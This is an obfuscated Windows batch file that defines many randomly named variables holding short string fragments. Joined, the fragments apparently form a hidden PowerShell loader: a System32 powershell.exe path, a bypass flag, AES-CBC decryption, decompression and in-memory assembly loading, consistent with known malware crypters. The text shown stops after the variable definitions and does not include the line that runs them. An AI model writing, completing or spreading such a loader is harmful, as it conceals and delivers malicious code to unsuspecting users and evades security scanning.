@echo off
set "FjOjbXTwYf=ow"
set "TRECsIxCjx=s\"
set "xSDnztKUpF=Sy"
set "WxhcdbMfXp=ws"
set "QUNlRyrYlM=ll"
set "tZndHEwIvN=we"
set "KGRTwDuiuB=in"
set "MMaMnUpwzM=Wi"
set "URhXkMGAKI=32"
set "ZzaWhBxqee=py"
set "QVBILQioSj=do"
set "dWaRjFCvVM=.e"
set "IqldWCYRKq=st"
set "RolfjOMXMw=he"
set "mYhswDGAFP=\W"
set "usHwTnzOPu=rS"
set "FAMkPzEvEv=0\"
set "EoyrVZuNJJ=\v"
set "bBrOOuRZqs=xe"
set "osQQJFmIDk=ll"
set "uyoxrMocZp= C"
set "WatiyTzhyB= /"
set "AcGEYcHFLB=:\"
set "rcjDWoaoAH=Po"
set "QIOMuTmNzC=co"
set "QhrLpstruH=nd"
set "aTyuSYCPtG=em"
set "mqYhheBoCv=rs"
set "sxgjRrxyHF=we"
set "RSLrrzYqfh=y "
set "WADdQDPTkj=po"
set "PlyfQemaZd=1."
set "vYioMoIvon=he"
set "oNHpHpVisp= %~dp0"
set "sjDEBMUGwI=cd"
set "aheYqCkwTW=rity"
set "jXbizTesMc=BC;$"
set "udNHgbyKZK=pDZz"
set "ttEcMlGQEV=oO, "
set "EJbRdLNNeL=.Com"
set "hRjKaqxRHq=pose"
set "KSIVBfayTe=Obje"
set "uKqruJgmOE=] -j"
set "qFiMkuKjBG=d = "
set "AzPvnbtJGL=);$U"
set "faZyVtSiuH=om.D"
set "zeqYqxtUEP=ose("
set "RanoEKvCNH== [S"
set "dMNHgJZFJW=6esa"
set "IbWNdrQqqe=pose"
set "KEqHMVTzQb=('l0"
set "kvJOaWleGz=$XPw"
set "JuqbhOaRFk='[-1"
set "XjUymydikq=pStr"
set "mRvGAhgaEx=gMod"
set "ivhBHgbZMb='[-1"
set "glbTWaOCmm=L.Pa"
set "hrewuOpCsC=('%*'"
set "zbWJugkSbD=comp"
set "IkTlcaufhf=7;$U"
set "kJEyzHOTVR=ring"
set "jDPAKNhvXQ=-joi"
set "uZlKomfJzY=[Sys"
set "HHLeistlWx=ypto"
set "QWxicqswui=bypa"
set "HUUaFjIxUK=tem."
set "czRVLjuNNh=th('"
set "mGEgEVtjLG=esFX"
set "waNqPOrKCJ=pres"
set "qRgLcMqKVG=ay()"
set "IFDrHiheZi=embl"
set "cBxsvFfwvD=le  "
set "AmBHKGfNdi=6] -"
set "cgFGPVyygV=16] "
set "dqsRpxxRzc=d = "
set "vSDWleHLFX=gth)"
set "GrbStWQvUh=oin "
set "evEQaVNbll=[IO."
set "KbjvOkYEpz=('da"
set "KxqtzrRYIy=null"
set "vwsOUeCVEu=iron"
set "XSgODBLBeQ=O = "
set "CxKYmIVpqK=mD.T"
set "imfXNKOcYL=JmD "
set "fvUmeEBpMG=File"
set "ZXerBEulDA=YDKL"
set "LHWSGvllGS=]::("
set "HSdggXojlL=ress"
set "zeWIGOjQoh=daeR"
set "XiJJYPLTVd=se()"
set "TlgxDHOwMU=gnir"
set "vPTpWTymET=bstr"
set "ydzTbiPnQG=oint"
set "HLGNnuxypd=xwQJ"
set "xHGUUWTtmn=.Key"
set "JsXYFRiEdL=736u"
set "BmIZsmzNtx=.Mem"
set "AlrfzcLoDg='gni"
set "jUgyvSymIj=ddin"
set "xVAuSOmmcx=oL'["
set "HQkaVTBAYM=form"
set "SYEOnDEAdW=ment"
set "WsyzPZQoXE='dqR"
set "yGRmTyOzzi=O.Me"
set "AtRaENgVjf=WacA"
set "JVhNaWcAyq= [st"
set "QtrnWDjGfB=.Dis"
set "kLqbgBcRXm=morF"
set "wzjSbVcOWH=V = "
set "hvrESIVeiN=XPwA"
set "iXHQdXnlbX=$Xyw"
set "jtDzEmzRUR=in $"
set "RdewgFVwVb=rtS4"
set "TrgbxZqdYB=yste"
set "ihmAlDnkCj=wQJ."
set "iOrHtSHwRD=rans"
set "mtAbfbmbFS=ewLi"
set "JoVLlEQMOD=Secu"
set "LmpIyfPFmh=3HWs"
set "RzSmyGGtFG=Fina"
set "BBoQtxBmul=gv.T"
set "efmuiVeiWv=Invo"
set "LjXdVSyaZo=join"
set "hbTTaQQqUD=onve"
set "pVUZSIRIsp=ZzAo"
